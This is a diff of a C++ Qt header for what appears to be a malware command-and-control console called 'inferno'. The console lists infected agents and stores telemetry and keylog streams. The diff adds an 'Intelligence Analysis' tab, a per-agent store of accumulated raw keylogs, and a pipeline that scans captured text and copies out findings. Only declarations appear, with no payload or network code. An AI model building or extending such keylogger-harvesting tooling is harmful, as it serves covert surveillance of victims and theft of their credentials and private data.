@@ -12,6 +12,8 @@
 #include <QInputDialog>
 #include <QLineEdit>
 #include <QComboBox>
+#include <QTabWidget>
+#include <QTableWidget>
 #include "server.hpp"
 
 namespace inferno {
@@ -47,15 +49,23 @@ private slots:
     void loadTelemetryHistory();
     void loadKeylogHistory();
 
+    // Circle 6 - Intelligence Analysis slots
+    void forceScanHistory();
+    void loadIntelligenceList();
+    void copySelectedIntel();
+    void clearIntelFindings();
+
 private:
     void setupUI();
     void loadStyleSheet();
     void appendToTelemetry(const QString& text);
     void appendToKeylog(const QString& text);
+    int runAnalysisPipeline(const QString& uuid, const std::string& text, const QString& contextLabel);
 
     Server* m_server;
 
     // UI Components
+    QTabWidget*     m_tabWidget;
     QListWidget*    m_agentList;
     QPlainTextEdit* m_telemetryConsole;
     QPlainTextEdit* m_keylogStream;
@@ -63,9 +73,15 @@ private:
     QLineEdit*      m_searchBox;
     QComboBox*      m_typeFilter;
     QLineEdit*      m_keylogSearchBox;
+
+    // Circle 6 - Intelligence Analysis Components
+    QTableWidget*   m_intelTable;
+    QComboBox*      m_intelTypeFilter;
+    QLineEdit*      m_intelSearchBox;
     
     // History Buffers
     QMap<QString, QString> m_agentIpToUuid; // Maps IP to persistent UUID
+    QMap<QString, QString> m_agentRawKeylogs; // Maps agent UUID to accumulated raw keylogs in-memory
     QStringList     m_telemetryHistory;
     QStringList     m_keylogHistory;
     
